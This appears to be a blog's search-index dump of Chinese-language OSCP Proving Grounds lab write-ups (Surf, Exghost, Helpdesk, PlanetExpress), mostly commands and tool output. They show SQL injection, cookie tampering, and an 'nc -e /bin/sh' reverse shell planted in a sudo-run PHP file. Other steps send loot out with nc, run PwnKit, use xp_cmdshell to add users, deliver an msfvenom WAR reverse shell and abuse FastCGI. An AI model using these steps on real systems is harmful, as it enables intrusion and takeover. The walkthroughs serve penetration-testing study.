| 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA) | 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA) |_ 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-title: Surfing blog | vulners: | cpe:/a:apache:http_server:2.4.38: CVEs | http-enum: | /css/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)' |_ /js/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)' Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.76 seconds ","date":"2024-01-02","objectID":"/posts/provinggrounds-surf/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Surf WriteUp","uri":"/posts/provinggrounds-surf/"},{"categories":["靶场"],"content":"Web扫描 访问 80端口Web服务，是个博客，文章作者是Admin。 Web扫描 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf] └─$ dirsearch -x 400,404 -t 500 -e php,asp,aspx,ini,txt,bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.162.171 发现管理后台登录口：http://192.168.162.171/administration/login.php 尝试暴破，失败 登录失败的返回包中有这个头Set-Cookie: auth_status=eydzdWNjZXNzJzonZmFsc2UnfQ%3D%3D，base64接码后为{'success':'false'} 抓包改包，手动修改为true后进入后台，绕过前端限制。 发现有个页面，测试发现存在order by点位的注入 http://192.168.162.171/administration/customers.php?search_string=c\u0026filter_col=if((substr(version(),1,1)='8'),id,phone)\u0026order_by=asc 测试发现后端SQL语句为： SELECT SQL_CALC_FOUND_ROWS id, f_name, l_name, gender, phone, created_at, updated_at FROM customers WHERE f_name like ? OR l_name like ? ORDER BY id ASC LIMIT 0, 15 因为不是考试，想偷懒，于是用上了sqlmap ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf] └─$ sqlmap -r sqli.txt --banner --level=3 --risk=3 -p 'filter_col' --batch …… GET parameter 'filter_col' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 516 HTTP(s) requests: --- Parameter: filter_col (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment) Payload: search_string=c\u0026filter_col=id AND 7911=(SELECT (CASE WHEN (7911=7911) THEN 7911 ELSE (SELECT 6771 UNION SELECT 4630) END))-- -\u0026order_by=asc Type: time-based blind Title: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP) Payload: search_string=c\u0026filter_col=id AND (SELECT 9022 FROM (SELECT(SLEEP(5)))HmQp)\u0026order_by=asc --- [16:36:30] [INFO] the back-end DBMS is MySQL [16:36:30] [INFO] fetching banner [16:36:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval [16:36:30] [INFO] retrieved: 10.3.31-MariaDB-0+deb10u1 web server operating system: Linux Debian 10 (buster) web application technology: Apache 2.4.38 back-end DBMS: MySQL \u003e= 5.0.12 (MariaDB fork) banner: '10.3.31-MariaDB-0+deb10u1' [16:37:10] [INFO] fetched data logged to text files under '/home/xavier/.local/share/sqlmap/output/192.168.162.171' [*] ending @ 16:37:10 /2023-12-03/ # 写shell失败 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf] └─$ sqlmap -r sqli.txt --level=3 --risk=3 -p 'filter_col' --batch --os-shell # 获取数据 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf] └─$ sqlmap -r sqli.txt --level=3 --risk=3 -p 'filter_col' --batch --dump …… Database: corephpadmin Table: admin_accounts [1 entry] +----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+ | id | series_id | expires | password | user_name | admin_type | remember_token | +----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+ | 11 | NULL | NULL | $2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm | james | super | NULL | +----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+ …… 拿到管理员密码哈希 尝试解密 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf] └─$ hashid '$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm' Analyzing '$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm' [+] Blowfish(OpenBSD) [+] Woltlab Burning Board 4.x [+] bcrypt ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf] └─$ echo '$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm' \u003e james.hash ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf] └─$ hashcat -h | grep -i bcrypt 3200 | bcrypt $2*$, Blowfish (Unix) | Operating System 25600 | bcrypt(md5($pass)) / bcryptmd5 | Forums, CMS, E-Commerce 25800 | bcrypt(sha1($pass)) / bcryptsha1 | Forums, CMS, E-Commerce 28400 | bcrypt(sha512($pass)) / bcryptsha512 | Forums, CMS, E-Commerce ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf] └─$ hashcat -m 3200 james.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-3000","date":"2024-01-02","objectID":"/posts/provinggrounds-surf/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Surf WriteUp","uri":"/posts/provinggrounds-surf/"},{"categories":["靶场"],"content":"权限提升 linpeas信息搜集 ╔══════════╣ Searching passwords in config PHP files $locale['853'] = \"Admin Password:\"; define('DB_PASSWORD', \"FlyToTheMoon213!\"); define('DB_USER', \"core\"); 拿到密码，试出来是james的 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf] └─$ sshpass -p 'FlyToTheMoon213!' ssh james@192.168.162.171 Linux Surf 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. $ id uid=1000(james) gid=1000(james) groups=1000(james) $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; james@Surf:~$ ls local.txt james@Surf:~$ cat local.txt a4e66109b23dd0df9165c992668efe14 james@Surf:~$ 查看sudo权限 james@Surf:~$ sudo -l We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [sudo] password for james: Matching Defaults entries for james on Surf: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User james may run the following commands on Surf: (ALL) /usr/bin/php /var/backups/database-backup.php james@Surf:~$ ls -al /var/backups/database-backup.php -rwxr-xr-x 1 www-data www-data 2758 Nov 9 2021 /var/backups/database-backup.php james@Surf:~$ 有思路了，修改PHP文件，sudo执行反弹shell 切换2个用户太麻烦了，主要是nc的shell不方便修改文件，干脆直接修改权限为777 www-data@Surf:/var/backups$ chmod 777 database-backup.php www-data@Surf:/var/backups$ ls -l database-backup.php -rwxrwxrwx 1 www-data www-data 2829 Dec 3 06:07 database-backup.php 试了下写在文件末尾不行，只能写在前面。 james@Surf:~$ vi /var/backups/database-backup.php james@Surf:~$ james@Surf:~$ head /var/backups/database-backup.php \u003c?php /** * Updated: Mohammad M. AlBanna * Website: MBanna.info */ system(\"nc 192.168.45.197 9000 -e /bin/sh\"); james@Surf:~$ sudo /usr/bin/php /var/backups/database-backup.php ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf] └─$ nc -nlvp 9000 listening on [any] 9000 ... connect to [192.168.45.197] from (UNKNOWN) [192.168.162.171] 33036 id uid=0(root) gid=0(root) groups=0(root) ls /root/ proof.txt cat /root/proof.txt e58a15c56a6f26de90c3393c15f0bc20 ","date":"2024-01-02","objectID":"/posts/provinggrounds-surf/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Surf WriteUp","uri":"/posts/provinggrounds-surf/"},{"categories":["靶场"],"content":"Exghost 第12台，Linux系统，难度Easy，名称 Exghost ","date":"2023-12-31","objectID":"/posts/provinggrounds-exghost/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Exghost Writeup","uri":"/posts/provinggrounds-exghost/"},{"categories":["靶场"],"content":"PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.242.183 -T4 [sudo] xavier 的密码： Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-21 09:43 CST Nmap scan report for 192.168.242.183 Host is up (0.27s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 20/tcp closed ftp-data 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.41 Service Info: Host: 127.0.0.1; OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.32 seconds ","date":"2023-12-31","objectID":"/posts/provinggrounds-exghost/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Exghost Writeup","uri":"/posts/provinggrounds-exghost/"},{"categories":["靶场"],"content":"InitAccess 对Web进行扫描 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ dirsearch -x 400,403,404 -t 500 -e php,asp,aspx,ini,txt,bak -u http://192.168.242.183/ _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, ini, txt, bak | HTTP method: GET | Threads: 500 | Wordlist size: 11475 Output File: /home/xavier/.dirsearch/reports/192.168.242.183/-_23-12-21_09-45-55.txt Error Log: /home/xavier/.dirsearch/logs/errors-23-12-21_09-45-55.log Target: http://192.168.242.183/ [09:45:56] Starting: [09:46:35] 301 - 320B - /uploads -\u003e http://192.168.242.183/uploads/ Task Completed 对ftp进行爆破 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.226.183 ftp Hydra v9.4 (c) 2022 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-31 14:24:43 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task [DATA] attacking ftp://192.168.226.183:21/ [21][ftp] host: 192.168.226.183 login: user password: system 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-31 14:25:12 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ ftp user@192.168.226.183 Connected to 192.168.226.183. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 229 Entering Extended Passive Mode (|||29597|) ftp: Can't connect to `192.168.226.183:29597': 连接超时 200 EPRT command successful. Consider using EPSV. 150 Here comes the directory listing. -rwxrwxrwx 1 0 0 126151 Jan 27 2022 backup 226 Directory send OK. ftp\u003e get backup local: backup remote: backup 200 EPRT command successful. Consider using EPSV. 150 Opening BINARY mode data connection for backup (126151 bytes). 100% |****************************************| 123 KiB 55.84 KiB/s 00:00 ETA 226 Transfer complete. 126151 bytes received in 00:02 (51.95 KiB/s) ftp\u003e exit 221 Goodbye. ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ file backup backup: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144) 是个数据包类型，想尝试用tcpdump去解析，没成功，直接双击backup，用wireshark进行分析 从中获取一个http数据包，发现文件上传接口exiftest.php： POST /exiftest.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------169621313238602050593908562572 Content-Length: 14806 Origin: http://127.0.0.1 Connection: keep-alive Referer: http://127.0.0.1/ Upgrade-Insecure-Requests: 1 -----------------------------169621313238602050593908562572 Content-Disposition: form-data; name=\"myFile\"; filename=\"testme.jpg\" Content-Type: image/jpeg ......JFIF.....x.x.....C...................... ..... ... .. ... ............................C....... .. . . .............................................................\"..................................... .....................}........!1A..Qa.\"q.2....#B...R..$3br. .....%\u0026'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz....................................................................................................... .....................w.......!1..AQ.aq.\"2...B.... #3R..br. .$4.%.....\u0026'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz....................................................................................?..h~.x9..:$......... {.........wq....a.....\u0026...~u.E,..f......rk....Ox7.","date":"2023-12-31","objectID":"/posts/provinggrounds-exghost/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Exghost Writeup","uri":"/posts/provinggrounds-exghost/"},{"categories":["靶场"],"content":"PE 上传文件，信息收集并回传 www-data@exghost:/tmp$ wget http://192.168.45.206/linpeas.sh www-data@exghost:/tmp$ ./linpeas.sh \u003e 1.txt . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe ./linpeas.sh: 1189: [[: not found ./linpeas.sh: 1189: rpm: not found ./linpeas.sh: 1189: 0: not found ./linpeas.sh: 1199: [[: not found Sorry, try again. ./linpeas.sh: 2583: grep -R -B1 \"httpd-php\" /etc/apache2 2\u003e/dev/null: not found gpg-connect-agent: no running gpg-agent - starting '/usr/bin/gpg-agent' gpg-connect-agent: failed to create temporary file '/var/www/.gnupg/.#lk0x000055c75a8c3cb0.exghost.13020': No such file or directory gpg-connect-agent: can't connect to the agent: No such file or directory gpg-connect-agent: error sending standard options: No agent running www-data@exghost:/tmp$ cp 1.txt /var/www/html/ cp: cannot create regular file '/var/www/html/1.txt': Permission denied www-data@exghost:/tmp$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... ^C Keyboard interrupt received, exiting. www-data@exghost:/tmp$ nc 192.168.45.206 443 \u003c 1.txt 发现存在CVE-2021-4034 Vulnerable to CVE-2021-4034 使用Pwnkit进行提权 www-data@exghost:/tmp$ ./PwnKit root@exghost:/tmp# ls /root/ proof.txt snap root@exghost:/tmp# cat /root/proof.txt ecbda28237ca915f1edb88a8b8a67826 root@exghost:/tmp# ","date":"2023-12-31","objectID":"/posts/provinggrounds-exghost/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Exghost Writeup","uri":"/posts/provinggrounds-exghost/"},{"categories":["靶场"],"content":"SumUp 爆破的字典选择很关键，不然会浪费很多时间和精力。 文件上传接口不一定是文件上传 多观察返回包，莫名其妙的提到某个工具，涉及到具体版本号，要多做信息收集和历史漏洞查询 ","date":"2023-12-31","objectID":"/posts/provinggrounds-exghost/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Exghost Writeup","uri":"/posts/provinggrounds-exghost/"},{"categories":["靶场"],"content":"Helpdesk 第11台，Windows系统，难度Easy，名称 Helpdesk 192.168.244.43 ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["靶场"],"content":"PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.244.43 -T4 -Pn Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-21 00:18 CST Nmap scan report for 192.168.244.43 Host is up (0.25s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ms-wbt-server Microsoft Terminal Service 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.82 seconds ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["靶场"],"content":"web ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ whatweb -a 3 http://192.168.244.43:8080/ http://192.168.244.43:8080/ [200 OK] Apache, Cookies[JSESSIONID], Country[RESERVED][ZZ], Frame, HTTPServer[Apache-Coyote/1.1], IP[192.168.244.43], Java, PasswordField[j_password], Script[text/JavaScript,text/javascript], Title[ManageEngine ServiceDesk Plus] ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ searchsploit manageEngine ServiceDesk Plus 搜索发现有漏洞，从Web页面可以看到是7.6版本。 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ searchsploit manageEngine ServiceDesk Plus 7.6 ------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------- --------------------------------- ManageEngine ServiceDesk Plus 7.6 - woID SQL Injection | jsp/webapps/11793.txt Zoho ManageEngine ServiceDesk Plus (SDP) \u003c 10.0 build 10012 - Arbi | jsp/webapps/46413.txt Zoho ManageEngine ServiceDesk Plus \u003c 10.5 - Improper Access Restri | multiple/webapps/46894.txt ------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ searchsploit -x 11793 …… Vulnerability Description: A Vulnerability has been discovered in Manage Engine Service Desk Plus, which can be exploited by malicious people to conduct SQL injection attacks. Input passed via the \"woID\" parameter to WorkOrder.do is not properly sanitized before being used in a SQL query. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code. The vulnerability is confirmed in version 7.6. Other versions may also be affected. Proof of Concept: Microsoft Windows Environment with MySQL: http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO\u0026woID=WorkOrder.WORKORDERID=6) union select 1,2,3,4,5,6,7,8,load_file(\"c:\\\\boot.ini\"),10,11,12,13,14,15,16,17,18,19,1 into dumpfile 'C:\\\\ManageEngine\\\\ServiceDesk\\\\applications\\\\extracted\\\\AdventNetServiceDesk.eear\\\\AdventNetServiceDeskWC.ear\\\\AdventNetServiceDesk.war\\\\images\\\\boot.ini'/* then browse, http://x.x.x.x:8080/images/boot.ini Microsoft Windows Environment with MSSQL: http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO\u0026woID=1); EXEC xp_cmdshell 'net user moebius m03biu5inj3ct$ /add';-- http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO\u0026woID=1); EXEC xp_cmdshell 'net localgroup administrators moebius /add';-- GNU/Linux with MySQL: http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO\u0026woID=1%29%20union%20select%201,2,3,4,5, 6,7,8,load_file%28%27/etc/passwd%27%29,10,11,12,13,14,15,16,17,18,19,20%20into%20dumpfile% 20%27/home/moebius/ManageEngine/ServiceDesk/applications/extracted/AdventNetServiceDesk.eear /AdventNetServiceDeskWC.ear/AdventNetServiceDesk.war/images/passwd.txt%27/* then browse, http://x.x.x.x:8080/images/passwd.txt 直接访问没有反应，可能需要登录。 Google搜索默认密码，发现是administrator\\administrator，使用这个密码成功登录后台 ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["靶场"],"content":"Init Access 我先拿的mssql的POC进行测试，爆出了SQL错误，提示是MySQL数据库： javax.servlet.ServletException: java.sql.SQLException: Syntax error or access violation, message from server: \u0026quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '; EXEC xp_cmdshell 'net user moebius m03biu5inj3ct$ /add';--)' at line 1\u0026quot; GET /WorkOrder.do?woMode=viewWO\u0026woID=WorkOrder.WORKORDERID%3d6)union+select+1,2,3,4,5,6,7,8,load_file(\"c%3a\\\\boot.ini\"),10,11,12,13,14,15,16,17,18,19,1+into+dumpfile+'C%3a\\\\ManageEngine\\\\ServiceDesk\\\\applications\\\\extracted\\\\AdventNetServiceDesk.eear\\\\AdventNetServiceDeskWC.ear\\\\AdventNetServiceDesk.war\\\\images\\\\boot.ini'/* HTTP/1.1 Host: 192.168.244.43:8080 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: JSESSIONID=2D805EDCF4BA886BE98027DA4AA04DE6; JSESSIONIDSSO=B426F21E2CB902688F345DBF470D7683 直接执行POC，返回报错找不到文件 尝试写webshell失败，jsp无法执行 尝试其他漏洞： ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.232 LPORT=80 -f war -o shell.war Payload size: 13323 bytes Final size of war file: 13323 bytes Saved as: shell.war ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ python3 cve-2014-5301.py 192.168.244.43 8080 administrator administrator shell.war Trying http://192.168.244.43:8080/5KF7BB1owtfPSmLhIyI7IvsioF80YhEQ/jjehycsuozbubil/D9zMMp8eubDUm04P 利用脚本：CVE-2014-5301 ManageEngine ServiceDesk Plus 7.6.0 Arbitrary File Upload ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ nc -nlvp 80 listening on [any] 80 ... connect to [192.168.45.232] from (UNKNOWN) [192.168.244.43] 49196 Microsoft Windows [Version 6.0.6001] Copyright (c) 2006 Microsoft Corporation. All rights reserved. C:\\ManageEngine\\ServiceDesk\\bin\u003ewhoami whoami nt authority\\system C:\\Users\u003etype administrator\\desktop\\proof.txt type administrator\\desktop\\proof.txt 362343a6e1593e22b5f3a58cdef9f423 ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["靶场"],"content":"PE 无需提权 ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["靶场"],"content":"Sum up 登录口，找下默认密码 不要太依赖searchsploit，里面漏洞不全 多利用搜索引擎，Google的搜索效果最好 多利用github搜索漏洞EXP ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:6:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["靶场"],"content":"PlanetExpress 第10台，Linux系统，难度Easy，名称 PlanetExpress 192.168.176.205 ","date":"2023-12-20","objectID":"/posts/provinggrounds-planetexpress/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds PlanetExpress Writeup","uri":"/posts/provinggrounds-planetexpress/"},{"categories":["靶场"],"content":"PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.176.205 -T4 [sudo] xavier 的密码： Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-19 14:32 CST Nmap scan report for 192.168.176.205 Host is up (0.40s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http Apache httpd 2.4.38 ((Debian)) 9000/tcp open cslistener? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 50.54 seconds ","date":"2023-12-20","objectID":"/posts/provinggrounds-planetexpress/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds PlanetExpress Writeup","uri":"/posts/provinggrounds-planetexpress/"},{"categories":["靶场"],"content":"WebScan ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ dirsearch -x 400,403,404 -t 500 -e php,asp,aspx,ini,txt,bak -u http://192.168.176.205 _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, ini, txt, bak | HTTP method: GET | Threads: 500 | Wordlist size: 11475 Output File: /home/xavier/.dirsearch/reports/192.168.176.205/_23-12-19_14-40-23.txt Error Log: /home/xavier/.dirsearch/logs/errors-23-12-19_14-40-23.log Target: http://192.168.176.205/ [14:40:24] Starting: [14:40:29] 200 - 111B - /.gitignore [14:40:37] 301 - 319B - /assets -\u003e http://192.168.176.205/assets/ [14:40:38] 301 - 319B - /config -\u003e http://192.168.176.205/config/ [14:40:39] 301 - 320B - /content -\u003e http://192.168.176.205/content/ [14:40:41] 200 - 5KB - /index.php/login/ [14:40:41] 200 - 5KB - /index.php [14:40:46] 301 - 320B - /plugins -\u003e http://192.168.176.205/plugins/ [14:40:50] 200 - 0B - /vendor/composer/autoload_psr4.php [14:40:50] 200 - 23KB - /vendor/composer/installed.json [14:40:50] 200 - 0B - /vendor/composer/autoload_real.php [14:40:50] 200 - 0B - /vendor/composer/autoload_files.php [14:40:50] 200 - 0B - /vendor/autoload.php [14:40:50] 200 - 0B - /vendor/composer/autoload_namespaces.php [14:40:50] 200 - 0B - /vendor/composer/autoload_static.php [14:40:50] 200 - 1KB - /vendor/composer/LICENSE [14:40:51] 301 - 319B - /themes -\u003e http://192.168.176.205/themes/ [14:40:53] 200 - 0B - /vendor/composer/ClassLoader.php [14:40:53] 200 - 0B - /vendor/composer/autoload_classmap.php Task Completed 扫描二级目录（总忘……） ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ dirsearch -x 400,403,404 -t 500 -e php,asp,aspx,ini,txt,bak -u http://192.168.176.205/config/ _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, ini, txt, bak | HTTP method: GET | Threads: 500 | Wordlist size: 11475 Output File: /home/xavier/.dirsearch/reports/192.168.176.205/-config-_23-12-19_15-20-33.txt Error Log: /home/xavier/.dirsearch/logs/errors-23-12-19_15-20-33.log Target: http://192.168.176.205/config/ [15:20:34] Starting: [15:20:39] 200 - 33B - /config/.gitignore [15:20:48] 200 - 812B - /config/config.yml Task Completed ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ curl \"http://192.168.176.205/config/config.yml\" …… ## # Self developed plugin for PlanetExpress # #PicoTest: # enabled: true ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ curl \"http://192.168.176.205/config/.gitignore\" # This file is meant to be empty 注意到config.yml中最末尾的注释，启用了自己开发的插件PicoTest。 访问发现是phpinfo ","date":"2023-12-20","objectID":"/posts/provinggrounds-planetexpress/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds PlanetExpress Writeup","uri":"/posts/provinggrounds-planetexpress/"},{"categories":["靶场"],"content":"Init Access 关于9000端口，在如下文章找到了历史漏洞和工具： https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 尝试读取文件成功： 尝试命令执行，回头看下phpinfo中的disable_functions，以下函数被禁用。 disable_functions system,exec,shell_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals, 最后找来这个函数: passthru ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ python3 fpm.py 192.168.244.205 \"/var/www/html/planetexpress/index.php\" -c '\u003c?php passthru(\"id\"); ?\u003e' | head Content-type: text/html; charset=UTF-8 uid=33(www-data) gid=33(www-data) groups=33(www-data) \u003c!DOCTYPE html\u003e \u003c!--[if lt IE 7]\u003e \u003chtml class=\"no-js lt-ie9 lt-ie8 lt-ie7\"\u003e \u003c![endif]--\u003e \u003c!--[if IE 7]\u003e \u003chtml class=\"no-js lt-ie9 lt-ie8\"\u003e \u003c![endif]--\u003e \u003c!--[if IE 8]\u003e \u003chtml class=\"no-js lt-ie9\"\u003e \u003c![endif]--\u003e \u003c!--[if gt IE 8]\u003e\u003c!--\u003e \u003chtml 